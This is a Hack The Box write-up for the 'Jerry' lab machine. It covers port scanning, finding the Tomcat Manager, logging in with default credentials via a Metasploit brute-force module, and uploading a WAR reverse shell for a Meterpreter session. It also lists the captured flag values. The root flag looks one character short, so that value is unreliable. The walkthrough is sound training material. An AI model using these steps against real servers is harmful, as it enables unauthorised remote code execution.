````markdown
# 🧑‍💻 Hack The Box – (Jerry)

## 📌 Overview
- **Machine Name:** Jerry
- **IP Address(es):** 10.10.10.95
- **Difficulty:** Easy
- **OS:** Windows
- **Tags:** Tomcat / Default Credentials / WAR Upload / Metasploit
- **Date Completed:** 2025.08.31
- **Status:** ✅ User | ✅ Root

---

## 🖥️ Initial Recon

### RustScan
```zsh
rustscan -a 10.10.10.95 --ulimit 5000
````

**Open Port:**

* 8080 → HTTP (Apache Tomcat)

---

## 📂 Service Enumeration

### Nmap

```zsh
nmap -sC -sV -p 8080 10.10.10.95
```

* Apache Tomcat/7.0.88
* Apache-Coyote/1.1
* Likely Tomcat Manager running at `/manager`

### Content Discovery

```zsh
feroxbuster -u http://10.10.10.95:8080/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
```

Found:

* `/manager/` → Tomcat Manager Console

---

## 🚀 Exploitation

### Brute-force Tomcat Manager

```zsh
msfconsole
use auxiliary/scanner/http/tomcat_mgr_login
```

Result:

```
[+] Login Successful: tomcat:s3cret
```

Default credentials worked.

### Upload WAR Reverse Shell

```zsh
use multi/http/tomcat_mgr_upload
```

* Uploaded `.war` file → triggered RCE
* Got Meterpreter session

---

## 🔑 Post Exploitation

Navigated to Administrator desktop:

```
C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt
```

Contents:

```
user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90
```

✅ Both flags found in the same file.

---

## 🏁 Flags

* **User.txt:** `7004dbcef0f854e0fb401875f26ebd00`
* **Root.txt:** `04a8b36e1545a455393d067e772fe90`

---

## 🧠 Lessons Learned

**Technical**

* Apache Tomcat often exposes `/manager` endpoint with dangerous functionality.
* Default credentials (`tomcat:s3cret`) remain common misconfigurations.
* WAR deployment is an easy path to RCE if manager access is available.

**Personal**

* Remember to try default creds when identifying Tomcat.
* Content discovery quickly confirms manager panels.

**Reusable Techniques**

* Scan for `/manager` and `/host-manager` on Tomcat servers.
* Use `msfconsole` for quick brute-force of Tomcat credentials.
* Exploit via WAR upload → immediate reverse shell access.

